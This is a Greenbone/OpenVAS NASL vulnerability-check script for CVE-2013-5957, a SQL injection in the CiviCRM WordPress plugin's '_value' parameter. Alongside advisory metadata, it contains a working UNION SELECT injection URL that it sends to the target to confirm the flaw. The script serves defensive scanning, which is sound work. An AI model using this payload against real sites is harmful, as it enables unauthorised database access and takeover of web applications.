CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804157" );
	script_version( "2020-02-26T12:57:19+0000" );
	script_cve_id( "CVE-2013-5957" );
	script_bugtraq_id( 64007 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-02-26 12:57:19 +0000 (Wed, 26 Feb 2020)" );
	script_tag( name: "creation_date", value: "2013-12-03 19:52:35 +0530 (Tue, 03 Dec 2013)" );
	script_name( "WordPress Plugin CiviCRM '_value' Parameter SQL Injection Vulnerability" );
	script_tag( name: "summary", value: "This host is running CiviCRM and is prone to SQL injection vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted exploit string via HTTP GET request and check whether it
is possible to execute sql query." );
	script_tag( name: "solution", value: "Update to CiviCRM version 4.2.12 or 4.3.7 or 4.4.beta4 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "insight", value: "The flaw is due to insufficient validation of '_value' HTTP GET parameter
passed to '/Location.php' script." );
	script_tag( name: "affected", value: "CiviCRM versions 4.2.x before 4.2.12, 4.3.x before 4.3.7, and 4.4.x before
4.4.beta4." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to execute arbitrary SQL
commands in applications database and gain complete control over the vulnerable
web application." );
	script_xref( name: "URL", value: "http://civicrm.org/advisory/civi-sa-2013-009-sql-injection-vulnerability" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
if(!cvPort = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: cvPort )){
	exit( 0 );
}
url = dir + "/?page=CiviCRM&q=civicrm/ajax/jqState/?q=civicrm/ajax/jqState&" + "_value=?q=civicrm/ajax/jqState&_value=-1%20UNION%20SELECT%201," + "concat(0x673716C2D696E6A656374696F6E2D74657374)";
if(http_vuln_check( port: cvPort, url: url, pattern: "sql-injection-test", extra_check: "name" )){
	security_message( cvPort );
	exit( 0 );
}

